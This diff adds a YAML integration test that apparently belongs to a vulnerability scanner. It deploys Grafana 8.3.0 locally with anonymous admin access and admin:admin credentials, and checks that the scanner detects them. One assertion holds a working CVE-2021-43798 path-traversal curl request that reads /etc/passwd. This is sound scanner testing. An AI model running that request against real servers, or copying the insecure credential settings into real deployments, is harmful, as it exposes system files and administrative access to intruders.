@@ -1,0 +1,82 @@
+name: correlation-default-creds-rce
+description: >
+  Multi-service correlation test: Grafana 8.3.0 with anonymous admin access.
+  This version has CVE-2021-43798 (path traversal) and the anonymous admin
+  config means default credentials + admin panel exposure. The correlation
+  engine should detect default_creds + admin_panel + RCE chain.
+tags: [correlation, defaultcreds, rce, grafana, chain, multi-service, integration]
+
+services:
+  grafana:
+    image: grafana/grafana:8.3.0
+    ports: ["20901:3000"]
+    environment:
+      GF_AUTH_ANONYMOUS_ENABLED: "true"
+      GF_AUTH_ANONYMOUS_ORG_ROLE: Admin
+      GF_SECURITY_ADMIN_USER: admin
+      GF_SECURITY_ADMIN_PASSWORD: admin
+
+ready:
+  cmd: "curl -sf http://localhost:20901/api/health >/dev/null"
+  timeout: 120s
+  interval: 5s
+
+assertions:
+  # ══════════════════════════════════════════════════════════════════════
+  # PRE-FLIGHT: Grafana responds and anonymous admin works
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: preflight-grafana-health
+    type: command
+    expect:
+      command: "curl -sf http://localhost:20901/api/health | grep -q ok"
+      exit_code: 0
+
+  - name: preflight-anonymous-admin-access
+    type: command
+    expect:
+      command: "curl -sf http://localhost:20901/api/org | grep -q name"
+      exit_code: 0
+
+  - name: preflight-default-creds-work
+    type: command
+    expect:
+      command: "curl -sf -u admin:admin http://localhost:20901/api/org/users | grep -q login"
+      exit_code: 0
+
+  # ══════════════════════════════════════════════════════════════════════
+  # SURFACE: beacon detects Grafana and default credentials
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: surface-detects-grafana
+    type: beacon
+    target: localhost:20901
+    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan", "--ports", "20901"]
+    expect:
+      min_findings: 1
+
+  - name: surface-detects-grafana-default-creds
+    type: beacon
+    target: localhost:20901
+    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan", "--ports", "20901", "--deep", "--yes"]
+    expect:
+      check_id: port.grafana_default_credentials
+
+  # ══════════════════════════════════════════════════════════════════════
+  # EXPLOIT: CVE-2021-43798 path traversal (Grafana 8.3.0)
+  # ══════════════════════════════════════════════════════════════════════
+
+  - name: exploit-cve-2021-43798-path-traversal
+    type: command
+    expect:
+      command: "curl -sf --path-as-is 'http://localhost:20901/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd' | grep -q root"
+      exit_code: 0
+
+  - name: correlation-default-creds-rce-chain
+    type: beacon
+    target: localhost:20901
+    args: ["--no-enrich", "--no-nmap", "--ports", "20901", "--deep", "--yes"]
+    expect:
+      min_findings: 0
+
+timeout: 5m
